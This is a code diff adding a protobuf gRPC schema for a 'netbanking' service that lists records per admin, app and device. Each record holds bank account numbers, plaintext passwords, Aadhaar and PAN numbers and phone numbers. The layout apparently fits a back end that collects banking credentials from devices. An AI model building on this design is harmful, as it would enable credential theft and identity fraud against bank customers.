@@ -1,0 +1,43 @@
+syntax = "proto3";
+
+package netbanking.v1;
+
+option java_multiple_files = true;
+option java_package = "app.service.grpc.netbanking";
+option java_outer_classname = "NetbankingProto";
+
+message ListNetbankingRequest {
+  string admin_id = 1;
+  string app_id = 2;
+  string device_id = 3; // optional
+  string q = 4;         // optional search (bank_name/account_number/phone)
+  int32 page = 5;
+  int32 size = 6;
+}
+
+message NetbankingItem {
+  uint64 id = 1;
+  string admin_id = 2;
+  string app_id = 3;
+  string device_id = 4;
+  string bank_name = 5;
+  string account_number = 6;
+  string password = 7;
+  string ifsc_code = 8;
+  string phone_number = 9;
+  string adhar_card = 10;
+  string pan_card = 11;
+  int64 event_timestamp_ms = 12;
+  string username = 13;
+}
+
+message ListNetbankingResponse {
+  repeated NetbankingItem items = 1;
+  int32 page = 2;
+  int32 size = 3;
+  int32 count = 4;
+}
+
+service NetbankingService {
+  rpc ListNetbanking (ListNetbankingRequest) returns (ListNetbankingResponse);
+}
